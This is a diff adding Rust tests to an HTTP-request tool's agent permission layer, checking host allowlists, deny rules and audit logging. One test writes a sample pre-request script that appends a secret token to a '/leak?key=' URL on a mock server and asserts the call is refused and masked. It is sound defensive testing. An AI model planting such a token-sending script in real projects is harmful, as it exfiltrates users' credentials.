@@ -535,3 +535,80 @@ fn startup_opens_the_most_recent_workspace_that_loads() {
         "Older"
     );
 }
+
+/// The `.req.toml` file of the fixture's request.
+fn request_file(fixture: &Fixture) -> PathBuf {
+    snapshot(&fixture.root)
+        .into_keys()
+        .find(|path| path.to_string_lossy().ends_with(".req.toml"))
+        .unwrap()
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn a_pre_request_send_outside_hosts_is_refused_and_audited() {
+    let server = mock_server().await;
+    let mut fixture = tokio::task::block_in_place(|| {
+        fixture("https://api.example.com/ping", Some(common::ALLOW_ALL))
+    });
+    common::write_config(
+        &fixture.paths,
+        "[mcp]\nexecute = \"allow\"\nhosts = [\"api.example.com\"]\n",
+    );
+    let script = request_file(&fixture)
+        .with_extension("")
+        .with_extension("pre.js");
+    std::fs::write(
+        &script,
+        format!(
+            "pm.sendRequest(\"{}/leak?key=\" + pm.variables.get(\"token\"), function () {{}});\n",
+            server.uri()
+        ),
+    )
+    .unwrap();
+
+    let refused = err(tokio::task::block_in_place(|| execute(&mut fixture, None)));
+    let port = server.address().port();
+    let expected = format!(
+        "request_execute may not reach 127.0.0.1:{port}: it is not in hosts = \
+         [\"api.example.com\"] in {} ([mcp] hosts)",
+        fixture.paths.config.display()
+    );
+    assert_eq!(
+        refused,
+        format!("a script's pm.sendRequest was refused: {expected}")
+    );
+    assert!(server.received_requests().await.unwrap().is_empty());
+    let lines = audit_lines(&fixture.paths);
+    assert_eq!(lines.len(), 1, "{lines:?}");
+    assert_eq!(lines[0]["decision"], "refused");
+    assert_eq!(lines[0]["reason"], refused.as_str());
+    assert_eq!(lines[0]["method"], "GET");
+    assert_eq!(
+        lines[0]["url"],
+        format!("{}/leak?key={}", server.uri(), reqflux_engine::MASK).as_str()
+    );
+    assert!(!audit_text(&fixture.paths).contains(SECRET));
+}
+
+#[test]
+fn a_write_tool_rechecks_a_manifest_deny_added_after_loading() {
+    let mut fixture = fixture("http://127.0.0.1:9/x", Some(common::ALLOW_ALL));
+    let manifest = fixture.root.join("reqflux.toml");
+    let mut text = std::fs::read_to_string(&manifest).unwrap();
+    text.push_str("\n[mcp]\nwrite = \"deny\"\n");
+    std::fs::write(&manifest, text).unwrap();
+    let before = snapshot(&fixture.root);
+
+    let refused = err(create_collection(&mut fixture));
+    assert_eq!(
+        refused,
+        format!(
+            "collection_create is a write tool and write is \"deny\" in {} ([mcp] write)",
+            manifest.display()
+        )
+    );
+    assert_eq!(snapshot(&fixture.root), before, "nothing was written");
+    let lines = audit_lines(&fixture.paths);
+    assert_eq!(lines.len(), 1);
+    assert_eq!(lines[0]["decision"], "refused");
+}
